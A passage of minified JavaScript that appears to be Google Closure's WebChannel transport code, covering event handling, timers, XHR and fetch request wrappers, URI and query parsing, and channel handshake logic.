n=e.type,r=e.proxy;t.removeEventListener?t.removeEventListener(n,r,e.capture):t.detachEvent?t.detachEvent(J2(n),r):t.addListener&&t.removeListener&&t.removeListener(r),(n=Py(t))?(Vm(n,e),0==n.h&&(n.src=null,t[by]=null)):Rd(e)}}}function J2(e){return e in Ep?Ep[e]:Ep[e]="on"+e}function JP(e,t){if(e.fa)e=!0;else{t=new Zl(t,this);var n=e.listener,r=e.la||e.src;e.ia&&Oy(e),e=n.call(r,t)}return e}function Py(e){return(e=e[by])instanceof Ad?e:null}var Tp="__closure_events_fn_"+(1e9*Math.random()>>>0);function $y(e){return"function"==typeof e?e:(e[Tp]||(e[Tp]=function(t){return e.handleEvent(t)}),e[Tp])}function $t(){Hi.call(this),this.i=new Ad(this),this.S=this,this.J=null}function Gt(e,t){var n,r=e.J;if(r)for(n=[];r;r=r.J)n.push(r);if(e=e.S,r=t.type||t,"string"==typeof t)t=new rn(t,e);else if(t instanceof rn)t.target=t.target||e;else{var i=t;G2(t=new rn(r,e),i)}if(i=!0,n)for(var s=n.length-1;0<=s;s--){var o=t.g=n[s];i=Dc(o,r,!0,t)&&i}if(i=Dc(o=t.g=e,r,!0,t)&&i,i=Dc(o,r,!1,t)&&i,n)for(s=0;s<n.length;s++)i=Dc(o=t.g=n[s],r,!1,t)&&i}function Dc(e,t,n,r){if(!(t=e.i.g[String(t)]))return!0;t=t.concat();for(var i=!0,s=0;s<t.length;++s){var o=t[s];if(o&&!o.fa&&o.capture==n){var a=o.listener,l=o.la||o.src;o.ia&&Vm(e.i,o),i=!1!==a.call(l,r)&&i}}return i&&!r.defaultPrevented}Lt($t,Hi),$t.prototype[ku]=!0,$t.prototype.removeEventListener=function(e,t,n,r){X2(this,e,t,n,r)},$t.prototype.N=function(){if($t.$.N.call(this),this.i){var e,t=this.i;for(e in t.g){for(var n=t.g[e],r=0;r<n.length;r++)Rd(n[r]);delete t.g[e],t.h--}}this.J=null},$t.prototype.O=function(e,t,n,r){return this.i.add(String(e),t,!1,n,r)},$t.prototype.P=function(e,t,n,r){return this.i.add(String(e),t,!0,n,r)};var Ly=le.JSON.stringify;function ZP(){var e=tT;let t=null;return e.g&&(t=e.g,e.g=e.g.next,e.g||(e.h=null),t.next=null),t}class e4{constructor(){this.h=this.g=null}add(e,t){const n=Z2.get();n.set(e,t),this.h?this.h.next=n:this.g=n,this.h=n}}var zm,Z2=new class{constructor(e,t){this.i=e,this.j=t,this.h=0,this.g=null}get(){let e;return 0<this.h?(this.h--,e=this.g,this.g=e.next,e.next=null):e=this.i(),e}}((()=>new t4),(e=>e.reset()));class t4{constructor(){this.next=this.g=this.h=null}set(e,t){this.h=e,this.g=t,this.next=null}reset(){this.next=this.g=this.h=null}}function n4(e){le.setTimeout((()=>{throw e}),0)}function eT(e,t){zm||r4(),Bm||(zm(),Bm=!0),tT.add(e,t)}function r4(){var e=le.Promise.resolve(void 0);zm=function(){e.then(i4)}}var Bm=!1,tT=new e4;function i4(){for(var e;e=ZP();){try{e.h.call(e.g)}catch(e){n4(e)}var t=Z2;t.j(e),100>t.h&&(t.h++,e.next=t.g,t.g=e)}Bm=!1}function bd(e,t){$t.call(this),this.h=e||1,this.g=t||le,this.j=nn(this.qb,this),this.l=Date.now()}function Fy(e){e.ga=!1,e.T&&(e.g.clearTimeout(e.T),e.T=null)}function Vy(e,t,n){if("function"==typeof e)n&&(e=nn(e,n));else{if(!e||"function"!=typeof e.handleEvent)throw Error("Invalid listener argument");e=nn(e.handleEvent,e)}return 2147483647<Number(t)?-1:le.setTimeout(e,t||0)}function nT(e){e.g=Vy((()=>{e.g=null,e.i&&(e.i=!1,nT(e))}),e.j);const t=e.h;e.h=null,e.m.apply(null,t)}Lt(bd,$t),(W=bd.prototype).ga=!1,W.T=null,W.qb=function(){if(this.ga){var e=Date.now()-this.l;0<e&&e<.8*this.h?this.T=this.g.setTimeout(this.j,this.h-e):(this.T&&(this.g.clearTimeout(this.T),this.T=null),Gt(this,"tick"),this.ga&&(Fy(this),this.start()))}},W.start=function(){this.ga=!0,this.T||(this.T=this.g.setTimeout(this.j,this.h),this.l=Date.now())},W.N=function(){bd.$.N.call(this),Fy(this),delete this.g};class s4 extends Hi{constructor(e,t){super(),this.m=e,this.j=t,this.h=null,this.i=!1,this.g=null}l(e){this.h=arguments,this.g?this.i=!0:nT(this)}N(){super.N(),this.g&&(le.clearTimeout(this.g),this.g=null,this.i=!1,this.h=null)}}function eu(e){Hi.call(this),this.h=e,this.g={}}Lt(eu,Hi);var Dw=[];function rT(e,t,n,r){Array.isArray(n)||(n&&(Dw[0]=n.toString()),n=Dw);for(var i=0;i<n.length;i++){var s=H2(t,n[i],r||e.handleEvent,!1,e.h||e);if(!s)break;e.g[s.key]=s}}function iT(e){Ay(e.g,(function(e,t){this.g.hasOwnProperty(t)&&Oy(e)}),e),e.g={}}function Od(){this.g=!0}function o4(e,t,n,r,i,s){e.info((function(){if(e.g)if(s)for(var o="",a=s.split("&"),l=0;l<a.length;l++){var u=a[l].split("=");if(1<u.length){var c=u[0];u=u[1];var h=c.split("_");o=2<=h.length&&"type"==h[1]?o+(c+"=")+u+"&":o+(c+"=redacted&")}}else o=null;else o=s;return"XMLHTTP REQ ("+r+") [attempt "+i+"]: "+t+"\n"+n+"\n"+o}))}function a4(e,t,n,r,i,s,o){e.info((function(){return"XMLHTTP RESP ("+r+") [ attempt "+i+"]: "+t+"\n"+n+"\n"+s+" "+o}))}function $o(e,t,n,r){e.info((function(){return"XMLHTTP TEXT ("+t+"): "+u4(e,n)+(r?" "+r:"")}))}function l4(e,t){e.info((function(){return"TIMEOUT: "+t}))}function u4(e,t){if(!e.g)return t;if(!t)return null;try{var n=JSON.parse(t);if(n)for(e=0;e<n.length;e++)if(Array.isArray(n[e])){var r=n[e];if(!(2>r.length)){var i=r[1];if(Array.isArray(i)&&!(1>i.length)){var s=i[0];if("noop"!=s&&"stop"!=s&&"close"!=s)for(var o=1;o<i.length;o++)i[o]=""}}}return Ly(n)}catch{return t}}eu.prototype.N=function(){eu.$.N.call(this),iT(this)},eu.prototype.handleEvent=function(){throw Error("EventHandler.handleEvent not implemented")},Od.prototype.Ea=function(){this.g=!1},Od.prototype.info=function(){};var Zs={},Cw=null;function Pd(){return Cw=Cw||new $t}function sT(e){rn.call(this,Zs.Ta,e)}function tu(e){const t=Pd();Gt(t,new sT(t))}function oT(e,t){rn.call(this,Zs.STAT_EVENT,e),this.stat=t}function cn(e){const t=Pd();Gt(t,new oT(t,e))}function aT(e,t){rn.call(this,Zs.Ua,e),this.size=t}function Du(e,t){if("function"!=typeof e)throw Error("Fn must not be null and must be a function");return le.setTimeout((function(){e()}),t)}Zs.Ta="serverreachability",Lt(sT,rn),Zs.STAT_EVENT="statevent",Lt(oT,rn),Zs.Ua="timingevent",Lt(aT,rn);var $d={NO_ERROR:0,rb:1,Eb:2,Db:3,yb:4,Cb:5,Fb:6,Qa:7,TIMEOUT:8,Ib:9},lT={wb:"complete",Sb:"success",Ra:"error",Qa:"abort",Kb:"ready",Lb:"readystatechange",TIMEOUT:"timeout",Gb:"incrementaldata",Jb:"progress",zb:"downloadprogress",$b:"uploadprogress"};function Uy(){}function Nw(e){return e.h||(e.h=e.i())}function uT(){}Uy.prototype.h=null;var jm,Cu={OPEN:"a",vb:"b",Ra:"c",Hb:"d"};function zy(){rn.call(this,"d")}function By(){rn.call(this,"c")}function Ld(){}function Nu(e,t,n,r){this.l=e,this.j=t,this.m=n,this.W=r||1,this.U=new eu(this),this.P=c4,e=Lm?125:void 0,this.V=new bd(e),this.I=null,this.i=!1,this.s=this.A=this.v=this.L=this.G=this.Y=this.B=null,this.F=[],this.g=null,this.C=0,this.o=this.u=null,this.aa=-1,this.J=!1,this.O=0,this.M=null,this.ca=this.K=this.ba=this.S=!1,this.h=new cT}function cT(){this.i=null,this.g="",this.h=!1}Lt(zy,rn),Lt(By,rn),Lt(Ld,Uy),Ld.prototype.g=function(){return new XMLHttpRequest},Ld.prototype.i=function(){return{}},jm=new Ld;var c4=45e3,qm={},zh={};function Ym(e,t,n){e.L=1,e.v=Vd(Hr(t)),e.s=n,e.S=!0,hT(e,null)}function hT(e,t){e.G=Date.now(),Mu(e),e.A=Hr(e.v);var n=e.A,r=e.W;Array.isArray(r)||(r=[String(r)]),wT(n.i,"t",r),e.C=0,n=e.l.I,e.h=new cT,e.g=UT(e.l,n?t:null,!e.s),0<e.O&&(e.M=new s4(nn(e.Pa,e,e.g),e.O)),rT(e.U,e.g,"readystatechange",e.nb),t=e.I?W2(e.I):{},e.s?(e.u||(e.u="POST"),t["Content-Type"]="application/x-www-form-urlencoded",e.g.ha(e.A,e.u,e.s,t)):(e.u="GET",e.g.ha(e.A,e.u,null,t)),tu(),o4(e.j,e.u,e.A,e.m,e.W,e.s)}function dT(e){return!!e.g&&("GET"==e.u&&2!=e.L&&e.l.Ha)}function fT(e,t,n){let r,i=!0;for(;!e.J&&e.C<n.length;){if(r=h4(e,n),r==zh){4==t&&(e.o=4,cn(14),i=!1),$o(e.j,e.m,null,"[Incomplete Response]");break}if(r==qm){e.o=4,cn(15),$o(e.j,e.m,n,"[Invalid Chunk]"),i=!1;break}$o(e.j,e.m,r,null),Wm(e,r)}dT(e)&&r!=zh&&r!=qm&&(e.h.g="",e.C=0),4!=t||0!=n.length||e.h.h||(e.o=1,cn(16),i=!1),e.i=e.i&&i,i?0<n.length&&!e.ca&&(e.ca=!0,(t=e.l).g==e&&t.ca&&!t.L&&(t.j.info("Great, no buffering proxy detected. Bytes received: "+n.length),Ky(t),t.L=!0,cn(11))):($o(e.j,e.m,n,"[Invalid Chunked Response]"),xs(e),xl(e))}function h4(e,t){var n=e.C,r=t.indexOf("\n",n);return-1==r?zh:(n=Number(t.substring(n,r)),isNaN(n)?qm:(r+=1)+n>t.length?zh:(t=t.substr(r,n),e.C=r+n,t))}function Mu(e){e.Y=Date.now()+e.P,pT(e,e.P)}function pT(e,t){if(null!=e.B)throw Error("WatchDog timer not null");e.B=Du(nn(e.lb,e),t)}function Fd(e){e.B&&(le.clearTimeout(e.B),e.B=null)}function xl(e){0==e.l.H||e.J||$T(e.l,e)}function xs(e){Fd(e);var t=e.M;t&&"function"==typeof t.ra&&t.ra(),e.M=null,Fy(e.V),iT(e.U),e.g&&(t=e.g,e.g=null,t.abort(),t.ra())}function Wm(e,t){try{var n=e.l;if(0!=n.H&&(n.g==e||Gm(n.h,e)))if(!e.K&&Gm(n.h,e)&&3==n.H){try{var r=n.Ja.g.parse(t)}catch{r=null}if(Array.isArray(r)&&3==r.length){var i=r;if(0==i[0]){e:if(!n.u){if(n.g){if(!(n.g.G+3e3<e.G))break e;qh(n),Bd(n)}Hy(n),cn(18)}}else n.Fa=i[1],0<n.Fa-n.V&&37500>i[2]&&n.M&&0==n.A&&!n.v&&(n.v=Du(nn(n.ib,n),6e3));if(1>=ET(n.h)&&n.na){try{n.na()}catch{}n.na=void 0}}else Is(n,11)}else if((e.K||n.g==e)&&qh(n),!Vh(t))for(i=n.Ja.g.parse(t),t=0;t<i.length;t++){let u=i[t];if(n.V=u[0],u=u[1],2==n.H)if("c"==u[0]){n.J=u[1],n.oa=u[2];const t=u[3];null!=t&&(n.qa=t,n.j.info("VER="+n.qa));const i=u[4];null!=i&&(n.Ga=i,n.j.info("SVER="+n.Ga));const c=u[5];null!=c&&"number"==typeof c&&0<c&&(r=1.5*c,n.K=r,n.j.info("backChannelRequestTimeoutMs_="+r)),r=n;const h=e.g;if(h){const e=h.g?h.g.getResponseHeader("X-Client-Wire-Protocol"):null;if(e){var s=r.h;s.g||-1==e.indexOf("spdy")&&-1==e.indexOf("quic")&&-1==e.indexOf("h2")||(s.j=s.l,s.g=new Set,s.h&&(jy(s,s.h),s.h=null))}if(r.F){const e=h.g?h.g.getResponseHeader("X-HTTP-Session-Id"):null;e&&(r.Da=e,Je(r.G,r.F,e))}}n.H=3,n.l&&n.l.Ba(),n.ca&&(n.S=Date.now()-e.G,n.j.info("Handshake RTT: "+n.S+"ms"));var o=e;if((r=n).wa=VT(r,r.I?r.oa:null,r.Y),o.K){TT(r.h,o);var a=o,l=r.K;l&&a.setTimeout(l),a.B&&(Fd(a),Mu(a)),r.g=o}else OT(r);0<n.i.length&&jd(n)}else"stop"!=u[0]&&"close"!=u[0]||Is(n,7);else 3==n.H&&("stop"==u[0]||"close"==u[0]?"stop"==u[0]?Is(n,7):Gy(n):"noop"!=u[0]&&n.l&&n.l.Aa(u),n.A=0)}tu(4)}catch{}}function d4(e){if(e.Z&&"function"==typeof e.Z)return e.Z();if(typeof Map<"u"&&e instanceof Map||typeof Set<"u"&&e instanceof Set)return Array.from(e.values());if("string"==typeof e)return e.split("");if(Nd(e)){for(var t=[],n=e.length,r=0;r<n;r++)t.push(e[r]);return t}for(r in t=[],n=0,e)t[n++]=e[r];return t}function f4(e){if(e.sa&&"function"==typeof e.sa)return e.sa();if(!e.Z||"function"!=typeof e.Z){if(typeof Map<"u"&&e instanceof Map)return Array.from(e.keys());if(!(typeof Set<"u"&&e instanceof Set)){if(Nd(e)||"string"==typeof e){var t=[];e=e.length;for(var n=0;n<e;n++)t.push(n);return t}t=[],n=0;for(const r in e)t[n++]=r;return t}}}function mT(e,t){if(e.forEach&&"function"==typeof e.forEach)e.forEach(t,void 0);else if(Nd(e)||"string"==typeof e)Array.prototype.forEach.call(e,t,void 0);else for(var n=f4(e),r=d4(e),i=r.length,s=0;s<i;s++)t.call(void 0,r[s],n&&n[s],e)}(W=Nu.prototype).setTimeout=function(e){this.P=e},W.nb=function(e){e=e.target;const t=this.M;t&&3==Lr(e)?t.l():this.Pa(e)},W.Pa=function(e){try{if(e==this.g)e:{const c=Lr(this.g);var t=this.g.Ia();const h=this.g.da();if(!(3>c)&&(3!=c||Lm||this.g&&(this.h.h||this.g.ja()||bw(this.g)))){this.J||4!=c||7==t||tu(8==t||0>=h?3:2),Fd(this);var n=this.g.da();this.aa=n;t:if(dT(this)){var r=bw(this.g);e="";var i=r.length,s=4==Lr(this.g);if(!this.h.i){if(typeof TextDecoder>"u"){xs(this),xl(this);var o="";break t}this.h.i=new le.TextDecoder}for(t=0;t<i;t++)this.h.h=!0,e+=this.h.i.decode(r[t],{stream:s&&t==i-1});r.splice(0,i),this.h.g+=e,this.C=0,o=this.h.g}else o=this.g.ja();if(this.i=200==n,a4(this.j,this.u,this.A,this.m,this.W,c,n),this.i){if(this.ba&&!this.K){t:{if(this.g){var a,l=this.g;if((a=l.g?l.g.getResponseHeader("X-HTTP-Initial-Response"):null)&&!Vh(a)){var u=a;break t}}u=null}if(!(n=u)){this.i=!1,this.o=3,cn(12),xs(this),xl(this);break e}$o(this.j,this.m,n,"Initial handshake response via X-HTTP-Initial-Response"),this.K=!0,Wm(this,n)}this.S?(fT(this,c,o),Lm&&this.i&&3==c&&(rT(this.U,this.V,"tick",this.mb),this.V.start())):($o(this.j,this.m,o,null),Wm(this,o)),4==c&&xs(this),this.i&&!this.J&&(4==c?$T(this.l,this):(this.i=!1,Mu(this)))}else 400==n&&0<o.indexOf("Unknown SID")?(this.o=3,cn(12)):(this.o=0,cn(13)),xs(this),xl(this)}}}catch{}},W.mb=function(){if(this.g){var e=Lr(this.g),t=this.g.ja();this.C<t.length&&(Fd(this),fT(this,e,t),this.i&&4!=e&&Mu(this))}},W.cancel=function(){this.J=!0,xs(this)},W.lb=function(){this.B=null;const e=Date.now();0<=e-this.Y?(l4(this.j,this.A),2!=this.L&&(tu(),cn(17)),xs(this),this.o=2,xl(this)):pT(this,this.Y-e)};var gT=RegExp("^(?:([^:/?#.]+):)?(?://(?:([^\\\\/?#]*)@)?([^\\\\/?#]*?)(?::([0-9]+))?(?=[\\\\/?#]|$))?([^?#]+)?(?:\\?([^#]*))?(?:#([\\s\\S]*))?$");function p4(e,t){if(e){e=e.split("&");for(var n=0;n<e.length;n++){var r=e[n].indexOf("="),i=null;if(0<=r){var s=e[n].substring(0,r);i=e[n].substring(r+1)}else s=e[n];t(s,i?decodeURIComponent(i.replace(/\+/g," ")):"")}}}function Ms(e,t){if(this.g=this.s=this.j="",this.m=null,this.o=this.l="",this.h=!1,e instanceof Ms){this.h=void 0!==t?t:e.h,Bh(this,e.j),this.s=e.s,this.g=e.g,jh(this,e.m),this.l=e.l,t=e.i;var n=new nu;n.i=t.i,t.g&&(n.g=new Map(t.g),n.h=t.h),Mw(this,n),this.o=e.o}else e&&(n=String(e).match(gT))?(this.h=!!t,Bh(this,n[1]||"",!0),this.s=al(n[2]||""),this.g=al(n[3]||"",!0),jh(this,n[4]),this.l=al(n[5]||"",!0),Mw(this,n[6]||"",!0),this.o=al(n[7]||"")):(this.h=!!t,this.i=new nu(null,this.h))}function Hr(e){return new Ms(e)}function Bh(e,t,n){e.j=n?al(t,!0):t,e.j&&(e.j=e.j.replace(/:$/,""))}function jh(e,t){if(t){if(t=Number(t),isNaN(t)||0>t)throw Error("Bad port number "+t);e.m=t}else e.m=null}function Mw(e,t,n){t instanceof nu?(e.i=t,S4(e.i,e.h)):(n||(t=ll(t,v4)),e.i=new nu(t,e.h))}function Je(e,t,n){e.i.set(t,n)}function Vd(e){return Je(e,"zx",Math.floor(2147483648*Math.random()).toString(36)+Math.abs(Math.floor(2147483648*Math.random())^Date.now()).toString(36)),e}function al(e,t){return e?t?decodeURI(e.replace(/%25/g,"%2525")):decodeURIComponent(e):""}function ll(e,t,n){return"string"==typeof e?(e=encodeURI(e).replace(t,m4),n&&(e=e.replace(/%25([0-9a-fA-F]{2})/g,"%$1")),e):null}function m4(e){return"%"+((e=e.charCodeAt(0))>>4&15).toString(16)+(15&e).toString(16)}Ms.prototype.toString=function(){var e=[],t=this.j;t&&e.push(ll(t,Rw,!0),":");var n=this.g;return(n||"file"==t)&&(e.push("//"),(t=this.s)&&e.push(ll(t,Rw,!0),"@"),e.push(encodeURIComponent(String(n)).replace(/%25([0-9a-fA-F]{2})/g,"%$1")),null!=(n=this.m)&&e.push(":",String(n))),(n=this.l)&&(this.g&&"/"!=n.charAt(0)&&e.push("/"),e.push(ll(n,"/"==n.charAt(0)?y4:g4,!0))),(n=this.i.toString())&&e.push("?",n),(n=this.o)&&e.push("#",ll(n,w4)),e.join("")};var Rw=/[#\/\?@]/g,g4=/[#\?:]/g,y4=/[#\?]/g,v4=/[#\?@]/g,w4=/#/g;function nu(e,t){this.h=this.g=null,this.i=e||null,this.j=!!t}function Ki(e){e.g||(e.g=new Map,e.h=0,e.i&&p4(e.i,(function(t,n){e.add(decodeURIComponent(t.replace(/\+/g," ")),n)})))}function yT(e,t){Ki(e),t=wa(e,t),e.g.has(t)&&(e.i=null,e.h-=e.g.get(t).length,e.g.delete(t))}function vT(e,t){return Ki(e),t=wa(e,t),e.g.has(t)}function wT(e,t,n){yT(e,t),0<n.length&&(e.i=null,e.g.set(wa(e,t),My(n)),e.h+=n.length)}function wa(e,t){return t=String(t),e.j&&(t=t.toLowerCase()),t}function S4(e,t){t&&!e.j&&(Ki(e),e.i=null,e.g.forEach((function(e,t){var n=t.toLowerCase();t!=n&&(yT(this,t),wT(this,n,e))}),e)),e.j=t}(W=nu.prototype).add=function(e,t){Ki(this),this.i=null,e=wa(this,e);var n=this.g.get(e);return n||this.g.set(e,n=[]),n.push(t),this.h+=1,this},W.forEach=function(e,t){Ki(this),this.g.forEach((function(n,r){n.forEach((function(n){e.call(t,n,r,this)}),this)}),this)},W.sa=function(){Ki(this);const e=Array.from(this.g.values()),t=Array.from(this.g.keys()),n=[];for(let r=0;r<t.length;r++){const i=e[r];for(let e=0;e<i.length;e++)n.push(t[r])}return n},W.Z=function(e){Ki(this);let t=[];if("string"==typeof e)vT(this,e)&&(t=t.concat(this.g.get(wa(this,e))));else{e=Array.from(this.g.values());for(let n=0;n<e.length;n++)t=t.concat(e[n])}return t},W.set=function(e,t){return Ki(this),this.i=null,vT(this,e=wa(this,e))&&(this.h-=this.g.get(e).length),this.g.set(e,[t]),this.h+=1,this},W.get=function(e,t){return e?0<(e=this.Z(e)).length?String(e[0]):t:t},W.toString=function(){if(this.i)return this.i;if(!this.g)return"";const e=[],t=Array.from(this.g.keys());for(var n=0;n<t.length;n++){var r=t[n];const s=encodeURIComponent(String(r)),o=this.Z(r);for(r=0;r<o.length;r++){var i=s;""!==o[r]&&(i+="="+encodeURIComponent(String(o[r]))),e.push(i)}}return this.i=e.join("&")};var _4=class{constructor(e,t){this.h=e,this.g=t}};function ST(e){this.l=e||E4,le.PerformanceNavigationTiming?e=0<(e=le.performance.getEntriesByType("navigation")).length&&("hq"==e[0].nextHopProtocol||"h2"==e[0].nextHopProtocol):e=!!(le.g&&le.g.Ka&&le.g.Ka()&&le.g.Ka().ec),this.j=e?this.l:1,this.g=null,1<this.j&&(this.g=new Set),this.h=null,this.i=[]}var E4=10;function _T(e){return!!e.h||!!e.g&&e.g.size>=e.j}function ET(e){return e.h?1:e.g?e.g.size:0}function Gm(e,t){return e.h?e.h==t:!!e.g&&e.g.has(t)}function jy(e,t){e.g?e.g.add(t):e.h=t}function TT(e,t){e.h&&e.h==t?e.h=null:e.g&&e.g.has(t)&&e.g.delete(t)}function xT(e){if(null!=e.h)return e.i.concat(e.h.F);if(null!=e.g&&0!==e.g.size){let t=e.i;for(const n of e.g.values())t=t.concat(n.F);return t}return My(e.i)}function qy(){}function T4(){this.g=new qy}function x4(e,t,n){const r=n||"";try{mT(e,(function(e,n){let i=e;Iu(e)&&(i=Ly(e)),t.push(r+n+"="+encodeURIComponent(i))}))}catch(e){throw t.push(r+"type="+encodeURIComponent("_badmap")),e}}function I4(e,t){const n=new Od;if(le.Image){const r=new Image;r.onload=kc(Cc,n,r,"TestLoadImage: loaded",!0,t),r.onerror=kc(Cc,n,r,"TestLoadImage: error",!1,t),r.onabort=kc(Cc,n,r,"TestLoadImage: abort",!1,t),r.ontimeout=kc(Cc,n,r,"TestLoadImage: timeout",!1,t),le.setTimeout((function(){r.ontimeout&&r.ontimeout()}),1e4),r.src=e}else t(!1)}function Cc(e,t,n,r,i){try{t.onload=null,t.onerror=null,t.onabort=null,t.ontimeout=null,i(r)}catch{}}function Ru(e){this.l=e.fc||null,this.j=e.ob||!1}function Ud(e,t){$t.call(this),this.F=e,this.u=t,this.m=void 0,this.readyState=Yy,this.status=0,this.responseType=this.responseText=this.response=this.statusText="",this.onreadystatechange=null,this.v=new Headers,this.h=null,this.C="GET",this.B="",this.g=!1,this.A=this.j=this.l=null}ST.prototype.cancel=function(){if(this.i=xT(this),this.h)this.h.cancel(),this.h=null;else if(this.g&&0!==this.g.size){for(const e of this.g.values())e.cancel();this.g.clear()}},qy.prototype.stringify=function(e){return le.JSON.stringify(e,void 0)},qy.prototype.parse=function(e){return le.JSON.parse(e,void 0)},Lt(Ru,Uy),Ru.prototype.g=function(){return new Ud(this.l,this.j)},Ru.prototype.i=function(e){return function(){return e}}({}),Lt(Ud,$t);var Yy=0;function IT(e){e.j.read().then(e.Xa.bind(e)).catch(e.ka.bind(e))}function Au(e){e.readyState=4,e.l=null,e.j=null,e.A=null,ru(e)}function ru(e){e.onreadystatechange&&e.onreadystatechange.call(e)}(W=Ud.prototype).open=function(e,t){if(this.readyState!=Yy)throw this.abort(),Error("Error reopening a connection");this.C=e,this.B=t,this.readyState=1,ru(this)},W.send=function(e){if(1!=this.readyState)throw this.abort(),Error("need to call open() first. ");this.g=!0;const t={headers:this.v,method:this.C,credentials:this.m,cache:void 0};e&&(t.body=e),(this.F||le).fetch(new Request(this.B,t)).then(this.$a.bind(this),this.ka.bind(this))},W.abort=function(){this.response=this.responseText="",this.v=new Headers,this.status=0,this.j&&this.j.cancel("Request was aborted.").catch((()=>{})),1<=this.readyState&&this.g&&4!=this.readyState&&(this.g=!1,Au(this)),this.readyState=Yy},W.$a=function(e){if(this.g&&(this.l=e,this.h||(this.status=this.l.status,this.statusText=this.l.statusText,this.h=e.headers,this.readyState=2,ru(this)),this.g&&(this.readyState=3,ru(this),this.g)))if("arraybuffer"===this.responseType)e.arrayBuffer().then(this.Ya.bind(this),this.ka.bind(this));else if(typeof le.ReadableStream<"u"&&"body"in e){if(this.j=e.body.getReader(),this.u){if(this.responseType)throw Error('responseType must be empty for "streamBinaryChunks" mode responses.');this.response=[]}else this.response=this.responseText="",this.A=new TextDecoder;IT(this)}else e.text().then(this.Za.bind(this),this.ka.bind(this))},W.Xa=function(e){if(this.g){if(this.u&&e.value)this.response.push(e.value);else if(!this.u){var t=e.value?e.value:new Uint8Array(0);(t=this.A.decode(t,{stream:!e.done}))&&(this.response=this.responseText+=t)}e.done?Au(this):ru(this),3==this.readyState&&IT(this)}},W.Za=function(e){this.g&&(this.response=this.responseText=e,Au(this))},W.Ya=function(e){this.g&&(this.response=e,Au(this))},W.ka=function(){this.g&&Au(this)},W.setRequestHeader=function(e,t){this.v.append(e,t)},W.getResponseHeader=function(e){return this.h&&this.h.get(e.toLowerCase())||""},W.getAllResponseHeaders=function(){if(!this.h)return"";const e=[],t=this.h.entries();for(var n=t.next();!n.done;)n=n.value,e.push(n[0]+": "+n[1]),n=t.next();return e.join("\r\n")},Object.defineProperty(Ud.prototype,"withCredentials",{get:function(){return"include"===this.m},set:function(e){this.m=e?"include":"same-origin"}});var k4=le.JSON.parse;function ct(e){$t.call(this),this.headers=new Map,this.u=e||null,this.h=!1,this.C=this.g=null,this.I="",this.m=0,this.j="",this.l=this.G=this.v=this.F=!1,this.B=0,this.A=null,this.K=kT,this.L=this.M=!1}Lt(ct,$t);var kT="",D4=/^https?$/i,C4=["POST","PUT"];function N4(e){return ra&&WP()&&"number"==typeof e.timeout&&void 0!==e.ontimeout}function Aw(e,t){e.h=!1,e.g&&(e.l=!0,e.g.abort(),e.l=!1),e.j=t,e.m=5,DT(e),zd(e)}function DT(e){e.F||(e.F=!0,Gt(e,"complete"),Gt(e,"error"))}function CT(e){if(e.h&&typeof Ny<"u"&&(!e.C[1]||4!=Lr(e)||2!=e.da()))if(e.v&&4==Lr(e))Vy(e.La,0,e);else if(Gt(e,"readystatechange"),4==Lr(e)){e.h=!1;try{const a=e.da();e:switch(a){case 200:case 201:case 202:case 204:case 206:case 304:case 1223:var t=!0;break e;default:t=!1}var n;if(!(n=t)){var r;if(r=0===a){var i=String(e.I).match(gT)[1]||null;if(!i&&le.self&&le.self.location){var s=le.self.location.protocol;i=s.substr(0,s.length-1)}r=!D4.test(i?i.toLowerCase():"")}n=r}if(n)Gt(e,"complete"),Gt(e,"success");else{e.m=6;try{var o=2<Lr(e)?e.g.statusText:""}catch{o=""}e.j=o+" ["+e.da()+"]",DT(e)}}finally{zd(e)}}}function zd(e,t){if(e.g){NT(e);const n=e.g,r=e.C[0]?Fh:null;e.g=null,e.C=null,t||Gt(e,"ready");try{n.onreadystatechange=r}catch{}}}function NT(e){e.g&&e.L&&(e.g.ontimeout=null),e.A&&(le.clearTimeout(e.A),e.A=null)}function Lr(e){return e.g?e.g.readyState:0}function bw(e){try{if(!e.g)return null;if("response"in e.g)return e.g.response;switch(e.K){case kT:case"text":return e.g.responseText;case"arraybuffer":if("mozResponseArrayBuffer"in e.g)return e.g.mozResponseArrayBuffer}return null}catch{return null}}function MT(e){let t="";return Ay(e,(function(e,n){t+=n,t+=":",t+=e,t+="\r\n"})),t}function Wy(e,t,n){e:{for(r in n){var r=!1;break e}r=!0}r||(n=MT(n),"string"==typeof e?null!=n&&encodeURIComponent(String(n)):Je(e,t,n))}function Ka(e,t,n){return n&&n.internalChannelParams&&n.internalChannelParams[e]||t}function RT(e){this.Ga=0,this.i=[],this.j=new Od,this.oa=this.wa=this.G=this.Y=this.g=this.Da=this.F=this.ma=this.o=this.U=this.s=null,this.fb=this.W=0,this.cb=Ka("failFast",!1,e),this.M=this.v=this.u=this.m=this.l=null,this.aa=!0,this.ta=this.Fa=this.V=-1,this.ba=this.A=this.C=0,this.ab=Ka("baseRetryDelayMs",5e3,e),this.hb=Ka("retryDelaySeedMs",1e4,e),this.eb=Ka("forwardChannelMaxRetries",2,e),this.xa=Ka("forwardChannelRequestTimeoutMs",2e4,e),this.va=e&&e.xmlHttpFactory||void 0,this.Ha=e&&e.dc||!1,this.K=void 0,this.I=e&&e.supportsCrossDomainXhr||!1,this.J="",this.h=new ST(e&&e.concurrentRequestLimit),this.Ja=new T4,this.P=e&&e.fastHandshake||!1,this.O=e&&e.encodeInitMessageHeaders||!1,this.P&&this.O&&(this.O=!1),this.bb=e&&e.bc||!1,e&&e.Ea&&this.j.Ea(),e&&e.forceLongPolling&&(this.aa=!1),this.ca=!this.P&&this.aa&&e&&e.detectBufferingProxy||!1,this.na=void 0,this.S=0,this.L=!1,this.pa=this.B=null}function Gy(e){if(AT(e),3==e.H){var t=e.W++,n=Hr(e.G);Je(n,"SID",e.J),Je(n,"RID",t),Je(n,"TYPE","terminate"),bu(e,n),(t=new Nu(e,e.j,t,void 0)).L=2,t.v=Vd(Hr(n)),n=!1,le.navigator&&le.navigator.sendBeacon&&(n=le.navigator.sendBeacon(t.v.toString(),"")),!n&&le.Image&&((new Image).src=t.v,n=!0),n||(t.g=UT(t.l,null),t.g.ha(t.v)),t.G=Date.now(),Mu(t)}FT(e)}function Bd(e){e.g&&(Ky(e),e.g.cancel(),e.g=null)}function AT(e){Bd(e),e.u&&(le.clearTimeout(e.u),e.u=null),qh(e),e.h.cancel(),e.m&&("number"==typeof e.m&&le.clearTimeout(e.m),e.m=null)}function jd(e){_T(e.h)||e.m||(e.m=!0,eT(e.Na,e),e.C=0)}function 